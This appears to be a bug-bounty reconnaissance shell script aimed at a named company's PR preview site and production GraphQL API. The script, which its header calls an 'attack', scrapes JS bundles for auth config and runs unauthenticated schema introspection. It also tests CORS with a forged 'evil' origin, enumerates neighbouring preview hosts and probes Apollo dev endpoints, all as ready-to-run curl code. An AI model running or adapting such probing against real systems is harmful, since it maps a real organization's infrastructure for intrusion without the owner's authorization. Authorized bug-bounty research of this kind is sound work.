#!/usr/bin/env bash
# gh-109705.pr.test.wiz.io — PR preview GraphQL attack
# apollo-client-dev build may have introspection enabled + relaxed auth
# Run on Pi: bash scripts/pr-preview-graphql-probe.sh 2>&1 | tee ~/pr-graphql-output.txt

set -euo pipefail
HOST="https://gh-109705.pr.test.wiz.io"
GQL="https://api.us1.app.wiz.io/graphql"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
OUT="$HOME/bug-bounty-hunting-/results/wiz.io/evidence/pr-preview"
mkdir -p "$OUT"

c() { curl -sk --connect-timeout 12 -A "$UA" "$@"; }
ci() { curl -sI --connect-timeout 12 -A "$UA" "$@"; }

echo "══════════════════════════════════════"
echo "Phase A — Fingerprint PR preview host"
echo "══════════════════════════════════════"
ci "${HOST}/" | tee "$OUT/headers.txt" | head -25

echo ""
echo "=== CSP: does it contain win-test.wiz.io or *.wiz.io? ==="
ci "${HOST}/" | grep -i "content-security-policy" | tr ';' '\n' | head -20

echo ""
echo "=== Page source: locate GraphQL API URL and auth config ==="
c "${HOST}/" | grep -oE '(https?://[^"'"'"']+\.wiz\.io[^"'"'"']*|graphql[^"'"'"']*|client_id[^"'"'"']*|auth0[^"'"'"']*)' | sort -u | head -30

echo ""
echo "══════════════════════════════════════"
echo "Phase B — Discover GraphQL endpoint from bundle"
echo "══════════════════════════════════════"
echo "=== Extract JS bundle URLs ==="
JS_URLS=$(c "${HOST}/" | grep -oE 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"//')
echo "$JS_URLS"
FIRST_JS=$(echo "$JS_URLS" | head -1)

if [ -n "$FIRST_JS" ]; then
  echo ""
  echo "=== Scanning $FIRST_JS for API config ==="
  BUNDLE=$(c "${HOST}${FIRST_JS}")
  echo "$BUNDLE" | grep -oE '(https?://[a-z0-9._-]*wiz\.io[^"'"'"']{0,100})' | sort -u | head -20
  echo ""
  echo "=== Looking for auth config in bundle ==="
  echo "$BUNDLE" | grep -oEi '(client_id|audience|domain|issuer|tenant)[^"'"'"']*["'"'"'][^"'"'"']{10,80}["'"'"']' | head -15
  echo "$BUNDLE" | grep -oEi '(apollo|graphql|endpoint|apiUrl)[^"'"'"']*["'"'"'][^"'"'"']{10,80}["'"'"']' | head -15
fi

echo ""
echo "══════════════════════════════════════"
echo "Phase C — GraphQL introspection (no auth)"
echo "══════════════════════════════════════"
echo "=== Introspection on main GraphQL API (no auth) ==="
INTRO=$(c -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Origin: ${HOST}" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind } } }"}')
echo "$INTRO" | python3 -m json.tool 2>/dev/null | head -60 || echo "$INTRO" | head -c 400

echo ""
echo "=== Type name enumeration (no auth) ==="
c -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Origin: ${HOST}" \
  -d '{"query":"{ __schema { types { name } } }"}' \
  | python3 -m json.tool 2>/dev/null | grep '"name"' | grep -v '"__' | head -30

echo ""
echo "══════════════════════════════════════"
echo "Phase D — CORS on GraphQL API from PR preview origin"
echo "══════════════════════════════════════"
echo "=== Does api.us1.app.wiz.io trust PR preview origin? ==="
CORS_RESP=$(curl -sk --connect-timeout 10 -A "$UA" \
  -H "Origin: ${HOST}" \
  -H "Access-Control-Request-Method: POST" \
  -X OPTIONS "${GQL}" -I)
echo "$CORS_RESP" | grep -i "access-control\|origin\|vary"

echo ""
echo "=== CORS: does API trust *.test.wiz.io origins? ==="
CORS_RESP2=$(curl -sk --connect-timeout 10 -A "$UA" \
  -H "Origin: https://evil.test.wiz.io" \
  -X OPTIONS "${GQL}" -I)
echo "$CORS_RESP2" | grep -i "access-control\|origin\|vary"

echo ""
echo "══════════════════════════════════════"
echo "Phase E — PR preview URL patterns (other PRs)"
echo "══════════════════════════════════════"
echo "=== Try adjacent PR numbers ==="
for pr in 109704 109703 109706 109700 109710 109800 110000; do
  HOST2="https://gh-${pr}.pr.test.wiz.io"
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 6 -A "$UA" "${HOST2}/")
  echo "${code}  ${HOST2}"
done

echo ""
echo "=== Try different PR preview patterns ==="
for pat in "pr-109705" "preview-109705" "109705.preview" "branch-109705"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 6 -A "$UA" "https://${pat}.test.wiz.io/")
  echo "${code}  https://${pat}.test.wiz.io"
done

echo ""
echo "══════════════════════════════════════"
echo "Phase F — Apollo dev tools endpoint discovery"
echo "══════════════════════════════════════"
echo "=== Apollo Studio (apollo-client-dev exposes /sandbox) ==="
for ep in \
  "/graphql" "/api/graphql" "/graphql/introspect" \
  "/__apollo_studio_sandbox__" "/__apollo__" \
  "/apollo-explorer" "/sandbox"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 6 -A "$UA" "${HOST}${ep}")
  echo "${code}  ${ep}"
done

echo ""
echo "=== Check if PR preview has its OWN GraphQL endpoint ==="
code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 -A "$UA" \
  -X POST "${HOST}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}')
echo "POST ${HOST}/graphql: ${code}"

echo ""
echo "Done. Evidence in $OUT/"
